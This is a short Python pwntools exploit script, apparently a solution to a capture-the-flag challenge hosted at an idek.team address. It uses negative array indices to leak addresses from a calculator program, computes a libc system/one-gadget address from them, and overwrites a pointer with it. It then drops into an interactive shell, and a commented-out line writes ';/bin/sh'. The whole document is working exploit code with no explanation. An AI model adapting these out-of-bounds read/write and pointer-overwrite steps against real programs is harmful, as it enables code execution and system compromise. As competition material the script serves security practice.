from pwn import *

io = remote('arithmetic-calculator.chal.idek.team', 1337)
#io = process('./integer_calc')

def leak(index):
    print(io.recvuntil(b'> '))
    io.sendline(b'2')
    print(io.recvuntil(b': '))
    io.sendline(b'0')
    print(io.recvuntil(b': '))
    io.sendline(str(index).encode('utf-8'))
    print(io.recvuntil(b'Addition result: '))
    return int(io.recvline())

def write(index, val):
    print(io.recvuntil(b'> '))
    io.sendline(b'0')
    print(io.recvuntil(b': '))
    io.sendline(str(index).encode('utf-8'))
    print(io.recvuntil(b': '))
    io.sendline(str(val).encode('utf-8'))

ignoreme = leak(-12) - 111
system = leak(-20) - 584784 + 0xe6c81
write(-20, system)
#write(-3, u64(b';/bin/sh'))
write(-12, ignoreme)
print(io.recvuntil(b'> '))
io.sendline(b'0')
io.interactive()
